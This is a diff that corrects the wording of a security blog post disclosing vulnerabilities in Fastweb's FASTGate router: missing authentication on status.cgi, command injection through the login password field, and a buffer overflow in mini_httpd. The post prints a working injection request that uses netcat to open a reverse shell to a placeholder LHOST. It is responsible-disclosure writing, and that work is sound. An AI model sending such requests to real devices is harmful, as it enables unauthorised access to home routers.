@@ -1,7 +1,7 @@
 ---
 layout: post
 title:  "Hacking into a FASTGate router with a command injection (and a bunch of other vulnerabilities)"
-subtitle: "Missing authentication, command injection in login page, buffer overflow on the web-server. Is this real life?"
+subtitle: "Missing authentication, command injection in login page, buffer overflow on the web server. Is this real life?"
 date:   2018-10-13 22:14:42 +0100
 author: "santoru"
 visible: 1
@@ -15,9 +15,9 @@ All vulnerabilities have been disclosed to Fastweb and are fixed in newer versio
 {:toc}
 
 ## FASTGate: the latest generation modem from Fastweb
-Fastweb[^1] is an Italian telecommunications company that provides internet services. Since around march 2017 the company started to ship a new modem to its client: the FASTGate[^2].
-Working as a penetration tester, and having the possibility to test it out, I started to analyze its web interface in order to find some vulnerabilities that could give me some unintended access to it. Goal of the night: popping up a shell!\ 
-First step was to set up Burp Suite as a proxy and navigate a bit through the webpages to save some request and response.
+Fastweb[^1] is an Italian telecommunications company that provides internet services. Since around March 2017 the company started to ship a new modem to its clients: the FASTGate[^2].
+Working as a penetration tester, and having the possibility to test it out, I started to analyze its web interface in order to find some vulnerabilities that could give me some unintended access to it. Goal of the night: popping a shell!\ 
+First step was to set up Burp Suite as a proxy and navigate a bit through the webpages to save some requests and responses.
 The first screen I got was the login panel, as shown in figure 1.
 
 {% include image.html url="img/fastgate/login.png" description="Figure 1 - Login panel" %}
@@ -31,12 +31,12 @@ For example, the following GET request was enough to list all devices connected 
 ```
 GET http://192.168.1.254/status.cgi?nvget=pc_list
 ```
-Just to have a nice output to show, I developed a python script that parses the json response and display it:
+Just to have a nice output to show, I developed a python script that parses the JSON response and displays it:
 
 {% include image.html url="img/fastgate/userenum.png" description="Figure 2 - Devices enumeration" %}
 
 ### Unauthenticated command injection in login page
-With this trivial _authentication bypass_ via the `status.cgi` binary, I went back to the login request and started to manually fuzz both the username and password fields. After few tests I noticed that the response of the server, after putting a single quotation mark into the password field, printed an interesting line:
+With this trivial _authentication bypass_ via the `status.cgi` binary, I went back to the login request and started to manually fuzz both the username and password fields. After a few tests I noticed that the response of the server, after putting a single quotation mark into the password field, printed an interesting line:
 ```
 HTTP/1.0 200 OK
 sh: syntax error: unterminated quoted string
@@ -52,11 +52,11 @@ The response was the confirmation I was looking for:
 {% include image.html url="img/fastgate/ping.png" description="Figure 3 - Ping command" %}
 
 
-As shown, I can successfully send arbitrary command by adding to the password input the text ```'$(`command`)'```.
+As shown, I can successfully send arbitrary commands by adding to the password input the text ```'$(`command`)'```.
 The impact of this vulnerability is full code execution on the router, but it's not clear what privileges I'm running with, having a shell to quickly interact with the router would be ideal!
 
 #### Getting the reverse shell
-The command execution is cool, but can we go further? Can we get a real shell into the system? Of course we can! After some enumeration done via the command injection, I noticed that the router shipped several `netcat` binaries, one of which was luckily compiled with support to the `-e` parameter that, quoting the man page, `execute external program after accepting a connection or making connection`.
+The command execution is cool, but can we go further? Can we get a real shell into the system? Of course we can! After some enumeration done via the command injection, I noticed that the router shipped several `netcat` binaries, one of which was luckily compiled with support to the `-e` parameter that, quoting the man page, `execute external program after accepting a connection or making a connection`.
 Let's use this `nc` binary to run a reverse shell:
 ```
 GET /status.cgi?cmd=3&nvget=login_confirm&password=AA'$(`/statusapi/usr/bin/nc%20LHOST%20LPORT%20-e%20/bin/bash`)AAremember_me=1&username=admin HTTP/1.1
@@ -73,10 +73,10 @@ It must be noted that in order to exploit the vulnerability the attacker must be
 {% include image.html url="img/fastgate/version.png" description="Figure 5 - Vulnerable version" %}
 
 
-The communication with Fastweb didn't go very smooth. I tried to contact them multiple time to report this vulnerability but after an initial ack they stopped any communication with me.
+The communication with Fastweb didn't go very smooth. I tried to contact them multiple times to report this vulnerability but after an initial ack they stopped any communication with me.
 Few weeks after my emails, they released a new firmware version that addressed most of the vulnerabilities:
-- Login request now returns a session token that it is used to authenticate all requests to `status.cgi`, so it seems that they fixed the trivial "bypass".
-- They initially added a CSRF protection by setting a cookie called `XSRF-TOKEN`: when sending a request, the web application send both the cookie and a `X-XSRF-TOKEN` header with the same value. There's no actual validation on the token value, no matter what the user decide to sent via these two headers, if the cookie matches the token value, the server will accept it.
+- Login request now returns a session token that is used to authenticate all requests to `status.cgi`, so it seems that they fixed the trivial "bypass".
+- They initially added a CSRF protection by setting a cookie called `XSRF-TOKEN`: when sending a request, the web application sends both the cookie and a `X-XSRF-TOKEN` header with the same value. There's no actual validation on the token value, no matter what the user decides to send via these two headers, if the cookie matches the token value, the server will accept it.
 - The command injection was still present in a bunch of updates, but was eventually fixed.
 
 At the time, they didn't have any responsible disclosure program nor any specific security contact, but they did create one shortly after my first email. The Responsible Disclosure[^3] webpage they created has an Hall-of-Fame, but I was not mentioned there.
@@ -86,9 +86,9 @@ At the time, they didn't have any responsible disclosure program nor any specifi
 One of the first things I noticed reading the response from the router was the `Server` header: `mini_httpd/1.27 07Mar2017`.\
 According to the developer's website of `mini_httpd`[^4], it seemed to be the latest available version at the time and I couldn't find any public information about known vulnerabilities on it.
 
-Since the source code was available, I started to do some analysis and I noticed a trivial buffer overflow in the `htpasswd.c` file, which turned out to be a custom and simplified version of the original _htpasswd_ utility developed for the Apache HTTP Server and used to`'create and update the flat-files used to store usernames and password for basic authentication of HTTP users`.\
-The simplified version developed by ACME Laboratories had a buffer overflow vulnerability since the username parameter provided through the command line interface was copied into a buffer without any bound check. The vulnerability could be exploited to execute malicious payloads if the utility can be used remotely to set up, for example, an account: In this case an attacker can craft an exploit and gain code execution into the vulnerable system.\
-After disclosing the vulnerability to the maintainer of the web-server an update that fixed the vulnerability was released through the developer's website.
+Since the source code was available, I started to do some analysis and I noticed a trivial buffer overflow in the `htpasswd.c` file, which turned out to be a custom and simplified version of the original _htpasswd_ utility developed for the Apache HTTP Server and used to 'create and update the flat-files used to store usernames and password for basic authentication of HTTP users`.\
+The simplified version developed by ACME Laboratories had a buffer overflow vulnerability since the username parameter provided through the command line interface was copied into a buffer without any bounds check. The vulnerability could be exploited to execute malicious payloads if the utility could be used remotely to set up, for example, an account: In this case an attacker could craft an exploit and gain code execution into the vulnerable system.\
+After disclosing the vulnerability to the maintainer of the web server, an update that fixed the vulnerability was released through the developer's website.
 
 ### Disclosure timeline of the Buffer Overflow
 - 01 December 2017 - Contacted the developer to ask how to report security findings
